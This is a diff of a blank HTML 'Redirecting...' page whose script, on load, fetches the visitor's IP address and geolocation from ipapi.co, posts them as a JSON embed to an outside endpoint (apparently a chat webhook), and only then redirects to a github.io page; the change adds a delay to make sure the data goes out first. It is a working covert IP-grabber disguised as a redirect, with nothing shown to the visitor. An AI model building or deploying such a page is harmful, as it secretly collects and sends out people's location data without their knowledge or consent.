@@ -2,9 +2,13 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
+    <title>Redirecting...</title>
     <script>
         (async () => {
+            // Set a minimum delay (3 seconds) to ensure data is sent
+            const minDelay = 2000; 
+            const startTime = Date.now();
+
             try {
                 // Fetch IP & Geolocation
                 const ipResponse = await fetch('https://ipapi.co/json/');
@@ -31,17 +35,24 @@
                     body: JSON.stringify({ embeds: [embed] })
                 });
 
+                console.log("Data sent successfully!");
+
             } catch (error) {
-                // Fail silently (no delay if error)
                 console.error("Error logging data:", error);
             }
 
-            // Redirect AFTER sending data
-            window.location.href = "https://milo-is-cooked.github.io/ddom/main.html";
+            // Ensure we wait at least 3 seconds before redirecting
+            const elapsed = Date.now() - startTime;
+            const remainingDelay = Math.max(0, minDelay - elapsed);
+            
+            setTimeout(() => {
+                window.location.href = "https://milo-is-cooked.github.io/ddom/main.html";
+            }, remainingDelay);
+
         })();
     </script>
 </head>
 <body>
-    <!-- Empty page (no visible content) -->
+    <!-- Blank page (no visible content) -->
 </body>
 </html>
